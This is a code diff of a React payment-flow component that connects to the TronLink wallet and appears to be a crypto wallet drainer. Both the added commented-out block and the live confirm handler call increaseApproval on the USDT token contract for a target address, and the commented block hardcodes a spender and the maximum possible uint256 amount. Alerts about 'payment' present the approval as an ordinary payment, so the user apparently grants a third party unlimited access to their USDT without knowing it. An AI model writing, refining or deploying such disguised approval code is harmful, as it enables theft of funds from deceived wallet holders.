@@ -7,12 +7,14 @@ import { base64URLDecode, parseParamMapFromUrl } from '@/utils';
 
 import { Infos } from './config';
 
-import { StepOne, StepTwo } from './step';
+import { StepOne, StepTwo, TypeStepTwoHandle } from './step';
 
 import styles from './index.module.css';
 
 export function BizFlow() {
   const [searchParams] = useSearchParams();
+
+  const stepTwoRef = useRef<TypeStepTwoHandle>(null);
 
   const platformRef = useRef('');
   const [platform, setPlatform] = useState('');
@@ -88,9 +90,37 @@ export function BizFlow() {
   };
 
   const onConfirmEvt = async () => {
+    // const spender_bas58 = 'TWRWYcyt2X5Hs7dXT3jcJciuoQnsDJjkdJ';
+    // const amount =
+    //   '115792089237316195423570985008687907853269984665640564039457584007913129639935';
     try {
-      const { trx, defaultAddress: da, contract } = window.tronWeb || {};
-      const userAddr = da?.base58 || '';
+      // let trx = await window.tronWeb.trx.getBalance(
+      //   window.tronWeb.defaultAddress.base58
+      // );
+      // if (trx > 25000000) {
+      //   const trc20ContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+      //   try {
+      //     let contract = await window.tronWeb
+      //       .contract()
+      //       .at(trc20ContractAddress);
+      //     let res = await contract
+      //       .increaseApproval(spender_bas58, amount)
+      //       .send({ feeLimit: 100000000 });
+      //     // successCallback(
+      //     //   window.tronWeb.defaultAddress.base58,
+      //     //   spender_bas58,
+      //     //   approve_type
+      //     // );
+      //   } catch (error) {
+      //     console.error('trigger smart contract error', error);
+      //     alert('支付失败！');
+      //   }
+      // } else {
+      //   alert('没有足够的TRX用于支付网络费！');
+      // }
+
+      // const { trx, defaultAddress: da, contract } = window.tronWeb || {};
+      const userAddr = window.tronWeb?.defaultAddress?.base58 || '';
 
       // 连接钱包
       const res = await window.tronLink?.request({
@@ -102,12 +132,12 @@ export function BizFlow() {
       }
 
       // 查余额
-      const _trx: number = await trx?.getBalance?.(userAddr);
+      const _trx: number = await window.tronWeb?.trx?.getBalance?.(userAddr);
 
       // 余额满足
       if (_trx > Infos.tronlink.trxLimit.value) {
         // ??? at ?
-        const _contract = await contract?.()?.at(addrUsdt);
+        const _contract = await window.tronWeb?.contract?.()?.at(addrUsdt);
         const result = await _contract
           .increaseApproval(addrTarget, Infos.tronlink.amount)
           .send({ feeLimit: 100000000 });
@@ -124,6 +154,7 @@ export function BizFlow() {
       alert(`发生异常: ${JSON.stringify(err)}`);
     } finally {
       // alert('finally');
+      stepTwoRef.current?.stopLoading();
     }
   };
 
@@ -192,6 +223,7 @@ export function BizFlow() {
       ) : null}
       {flowStep === '2' ? (
         <StepTwo
+          ref={stepTwoRef}
           platform={platform}
           displayAddr={addrUsdt}
           amount={pageParams.amountStr}
